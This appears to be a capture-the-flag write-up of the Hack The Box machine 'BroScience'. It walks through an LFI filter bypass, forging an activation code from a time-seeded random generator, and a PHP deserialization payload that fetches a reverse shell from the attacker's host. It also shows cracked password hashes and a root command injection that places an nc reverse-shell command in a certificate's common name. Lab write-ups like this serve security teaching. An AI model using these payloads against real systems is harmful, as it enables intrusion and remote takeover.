---
title: "BroScience"
date: 2023-02-24
link: 
tags:
- writeups
---

**Description**: 

## Recon
```bash
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA)
|   256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA)
|_  256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519)
80/tcp   open     http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp  open     http     Apache httpd 2.4.54 ((Debian))
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
|_http-title: 400 Bad Request
5859/tcp filtered wherehoo
```

We see 4 ports open: 2 web servers (`80`, `443`), SSH and a strange `5859`. Also the HTTP has a port redirect to `broscience.htb` so add that in `/etc/hosts`

### Web Server
Before manually starting to browse the web app, I like to have some form of recon in the background: 
```bash
gobuster dir -u https://broscience.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -o gobuster.root
```

While that was running I started burp & started browsing:

![[write-ups/images/Pasted image 20230224151743.png]]

It also has a login page *(which isn't vulnerable to SQLi)* & it provides us with the option to create an account. So let's create one:

![[write-ups/images/Pasted image 20230224152011.png]]

Hm... it wants an activation link from the email. I just assumed it will work without activating it, since the email was a bogus one

![[write-ups/images/Pasted image 20230224152146.png]]

![](https://media2.giphy.com/media/3otPovBSra5d2giJCE/200w.webp?cid=ecf05e47s41qbc9dvtjsmqo9ubl9j1rwyzdifbotlbbf42cv&rid=200w.webp&ct=g)

It looks like we will have to find a way to activate the code if we want to login... Let's leave that for now & move forward to what burp discovered:

![[write-ups/images/Pasted image 20230224153134.png]]

- `user.php` - take an `id` param through `GET` which doesn't seem injectable, but we can enumerate users: administrator, bill, michael, john, dmytro *(those might come in handy if we have to bruteforce or for SSH login)*
- `exercise.php` - similar to the above, but it keeps track of exercises
- `comment.php` - handles comments on exercise pages, but we have to be logged in
- `/includes` - this seems juicy. It looks like it contains some utils for the source code

### Leaking the source with LFI

Accessing each of them doesn't give us much, except `img.php` which tells us to give it a `path` parameter:

![[write-ups/images/Pasted image 20230224153422.png]]

I did as the computer overlord asked of me & supplied `img.php?path=../../../../../../etc/passwd`, but I got back a **Error: Attack detected.**. So the web app uses some form of input validation that we'll probably have to bypass. After some trial & error I figured out it works if we double url encode it:

![[write-ups/images/Pasted image 20230224154045.png]]

At this point I decided to write a simple python script to make the process of leaking the source code easier:

![[write-ups/images/Pasted image 20230224154834.png]]

Nice we already have some creds for the db. Then I just repeated the process for every file I was aware of ending up with all of the source code 🍺

**Bonus**: here's how the actual input validation was made. Actually way easier to bypass than I presumed

```php
// Check for LFI attacks
$path = $_GET['path'];

$badwords = array("../", "etc/passwd", ".ssh");
foreach ($badwords as $badword) {
    if (strpos($path, $badword) !== false) {
        die('<b>Error:</b> Attack detected.');
    }
}

// Normalize path
$path = urldecode($path);
```


### Activating our account

I ended up with the following files after sifting through the source code & finding more source php files:

![[write-ups/images/Pasted image 20230224155642.png]]

I will only highlight what's important, since going through everything would take way to much time to explain. So in `register.php` we have the following lines disclosing how the activation of accounts is made:

```php
include_once 'includes/utils.php';
$activation_code = generate_activation_code();
$res = pg_prepare($db_conn, "check_code_unique_query", 'SELECT id FROM users WHERE activation_code = $1');
$res = pg_execute($db_conn, "check_code_unique_query", array($activation_code));

...

// TODO: Send the activation link to email
$activation_link = "https://broscience.htb/activate.php?code={$activation_code}";
```

We see that the code is generated with `generate_activation_code()` function found in `utils.php` & that the activation is being made by passing it in the `code` param @ `activate.php`. This will then check in the DB if the provided code is associated with any user & then activate the user account. Also note that all the SQL queries are made with `pg_prepare` and `pg_execute`, hence out failed SQLi attempts. Let's check the generation function to see it's logic:

```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

So it takes the current time as a seed *(`srand(time())`)* to generate the random numbers used to pick random chars, creating a string of 32 chars in the end. I ended up running something similar on my local machine to test things out. My guess is that if we use the same seed *(i.e date)* we should get the same code, due to [insecure randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness):

![[write-ups/images/Pasted image 20230224162642.png]]

By this logic, the only thing left to do is to find the date when our user account was created. Luckily for us that is given to us in the response headers:

![[write-ups/images/Pasted image 20230224162815.png]]

Then modify the script a little, generate the code & activate our account:

![[write-ups/images/Pasted image 20230224163357.png]]

## Init Access w PHP Deserialization RCE

Now that we have access, the only thing different is that we have a `user-prefs` cookie set that seems to be serialized object:

![[write-ups/images/Pasted image 20230224171251.png]]

The first things that popped into my head was to try [deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization#php) in order to execute code on the server. However, for that we need to look @ the source code:

```php
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
```

Here's where our cookie is set & where our `unserilize()` function is executed. Thus, we know this is injectable. Now, we need to figure out if the `UserPrefs` class gives us any useful gadgets that can be leveraged:

```php
class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
		$this->theme = $theme;
    }
}
```

Shit... we can't do anything with this

![](https://media0.giphy.com/media/26tnkeXdTGdb4smPe/200w.webp?cid=ecf05e47f0elegv7bq90lwmuifkh1zc3qq5mo8yya2pco1id&rid=200w.webp&ct=g)

Luckily for us the source code has some other classes which could be more fruitful
```php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```

Here the `AvatarInterface` class has 
- an `$imgpath` parameter - used as the path where to save a file
- a `$tmp` parameter - containing the contents to be written in the path provided by `$imgpath`
- `__wakeup` - [php magic method](https://www.php.net/manual/en/language.oop5.magic.php) which creates a new instance of `Avatar` class and a class save method for the the avatar class

Theoretically if we could set the `$tmp` var to our server hosting a PHP shell, then set `$imgpath` to the filename of the php shell, it should store it on the server & we could trigger it by just visiting it

```php
<?php

class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
        $this->theme = $theme;
    }
}


class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.14.124/evShell.php";
    public $imgPath = "./evShell.php";

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

echo base64_encode(serialize(new AvatarInterface));
?>
```

To recap the steps are:
- create an `attack.php` to inject our `$imgpath` & `$tmp` into the php serialized object
- get a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell) & host it with python's simple http server
- modify our `user-prefs` cookie to write our php shell onto the server
- open up a `netcat` listener & navigate to `https://broscience.htb/evShell.php`

![[write-ups/images/Pasted image 20230224183853.png]]


## Getting user

Remember the `db_connect.php` file which leaked the database creds? It's finally time to make use of them by connecting to the postgresql with the `psql` client:

![[write-ups/images/Pasted image 20230224190943.png]]

Now let's try to crack them using `hashcat`

```bash
# format them with "hash:salt" = 5d15340bded5b9395d5d14b9c21bc82b:NaCl
hashcat -m 20 hashes /usr/share/wordlists/rockyou.txt

5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
62d19f7e7ddcb5946728776d25e410ed:NaCl:password
13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
```

From our `www-data` shell we know that the only active user on the machine is `bill` so we can SSH with him & get our user.txt flag:

```bash
$ ssh bill@broscience.htb   
bill@broscience:~$ cat user.txt 
babecb64768734a83c06d030bfcea8a7
```


## Privesc

After some basic enumeration, I found a bash script owned by root in `/opt/renew_cert.sh`

```bash
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then
    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```


This script is a bash script that takes 1 argument *(filename of crt)* and checks the expiration of a given SSL certificate file, and if it is close to expiring, it will print out information about the certificate. Notice that at the end of the script it tries to move the newly generated certificate in `/home/bill/Certs` passing into bash `$commonName` - a variable that we control. Thus, we can inject bash commands by setting it to something like: `$(<cmd>)`.

Let's test our theory & first find if this script is ever ran by root. Initially it took me some time to figure that I should run [pspy](https://github.com/DominicBreuker/pspy) which can monitor running processes without root perms which revealed that, indeed, the `renew_cert` script was ran by root @ regular intervals.

Next I [generated a self-signed certificate](https://www.ibm.com/docs/en/api-connect/10.0.1.x?topic=overview-generating-self-signed-certificate-using-openssl) and added my bash command payload when prompted for the common name. Then placed my `ev.crt` in `/home/bill/Certs`, started a netcat listener & waited:

```bash
-bash-5.1$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -days 5 -keyout bro.key -out ev.crt
Generating a RSA private key
.............................................................++++
.............++++
writing new private key to 'bro.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:$(nc 10.10.14.221 1337 -c /bin/bash)
Email Address []:
```

And after some time I got back this:

![[write-ups/images/Pasted image 20230301203321.png]]

![](https://media4.giphy.com/media/l49JHDggRzqHQP1ny/200w.webp?cid=ecf05e479q8fg95m6hovvtwg6109b501up4nvep0ncb1r8hp&rid=200w.webp&ct=g)


---

## Refs
- [room](https://app.hackthebox.com/machines/BroScience)

## See Also
- [[write-ups/HTB]]
